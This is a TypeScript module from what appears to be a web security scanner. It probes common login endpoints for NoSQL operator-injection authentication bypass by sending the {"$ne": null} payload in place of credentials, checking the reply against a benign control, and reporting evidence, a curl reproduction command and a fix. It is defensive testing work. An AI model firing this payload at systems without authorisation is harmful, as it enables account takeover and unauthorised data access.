// NoSQL operator-injection active probe (AGGRESSIVE tier). Targets JSON login-
// style endpoints and sends a MongoDB-style operator object ({"$ne": null}) in
// place of the credential values. A differential proof: benign string creds are
// rejected, but the operator payload authenticates — meaning the app passes user
// input straight into a NoSQL query as query operators. Non-destructive: it only
// attempts to observe an auth-state difference, it does not persist anything.
import { aggFetch } from "./aggHttp.js";
import { renderRawRequest } from "../evidence.js";
import type { ProbeContext, RedTeamFinding } from "../redTeam/types.js";
import type { ExploitEvidence } from "../../src/types.js";

const LOGIN_PATHS = ["/api/login", "/login", "/api/auth/login", "/api/session", "/auth/login"];

// Signals that a login response represents an AUTHENTICATED session.
const AUTH_SIGNATURE = /("authenticated"\s*:\s*true|"token"\s*:\s*"|"success"\s*:\s*true|"role"\s*:\s*"admin")/i;

export async function probeNoSql(ctx: ProbeContext): Promise<RedTeamFinding | null> {
  const headers = { ...ctx.fuzzHeaders, "Content-Type": "application/json" };
  const benign = JSON.stringify({ username: "seclayer_probe", password: "seclayer_probe" });
  const inject = JSON.stringify({ username: { $ne: null }, password: { $ne: null } });

  for (const path of LOGIN_PATHS) {
    const target = `${ctx.url.replace(/\/+$/, "")}${path}`;

    // Control first: benign string credentials must NOT authenticate.
    let benignAuthed = true; // default true so a missing/odd endpoint is skipped, not flagged
    try {
      const bRes = await aggFetch(target, { method: "POST", headers, body: benign });
      if (bRes.status === 404) continue; // no such endpoint here
      const bText = await bRes.text();
      benignAuthed = AUTH_SIGNATURE.test(bText);
    } catch {
      continue;
    }
    if (benignAuthed) continue; // endpoint authenticates anything → not a clean signal

    // Attack: the operator-injection payload.
    let aRes: Response;
    let aText: string;
    try {
      aRes = await aggFetch(target, { method: "POST", headers, body: inject });
      aText = await aRes.text();
    } catch {
      continue;
    }
    const match = AUTH_SIGNATURE.exec(aText);
    if (aRes.status < 500 && match) {
      // Differential proof: operator payload authenticated where benign creds did not.
      const respBody = aText.length > 1500 ? aText.slice(0, 1500) + "\n[…truncated]" : aText;
      const response = [`HTTP/1.1 ${aRes.status} ${aRes.statusText}`, `content-type: ${aRes.headers.get("content-type") || ""}`, "", respBody].join("\n");
      const evidence: ExploitEvidence = {
        method: "differential",
        attack: { request: renderRawRequest("POST", target, headers, inject), response },
        baseline: { request: renderRawRequest("POST", target, headers, benign), response: "(benign string credentials were rejected — not authenticated)" },
        signal: { quote: match[0], offsetInResponse: response.indexOf(match[0]), why: `The operator payload {"$ne":null} produced an authenticated response ("${match[0]}") while benign string credentials to the same endpoint were rejected — so user input is being used as a NoSQL query operator.` },
        demonstration: `We sent {"username":{"$ne":null},"password":{"$ne":null}} to ${path}; the server authenticated the request, yet ordinary string credentials were rejected. That difference proves the login query interprets our input as MongoDB operators — a NoSQL injection authentication bypass.`,
        reproduction: `curl -s -X POST "${target}" -H "Content-Type: application/json" --data '${inject}'`,
        capturedAt: new Date().toISOString(),
      };
      return {
        testName: "Active NoSQL Injection (operator authentication bypass)",
        payload: inject,
        severity: "critical",
        description:
          "Active Red Team fuzzing bypassed authentication by submitting a MongoDB-style operator object in place of the credential values: the app passed request input directly into a NoSQL query as query operators. This allows authentication bypass and unauthorized data access.",
        fix: "Reject non-string credential values and cast inputs to their expected type before querying. Never pass raw request objects into a query filter; use a schema/validator so an attacker cannot inject query operators like $ne, $gt, or $regex.",
        evidence,
      };
    }
  }
  return null;
}
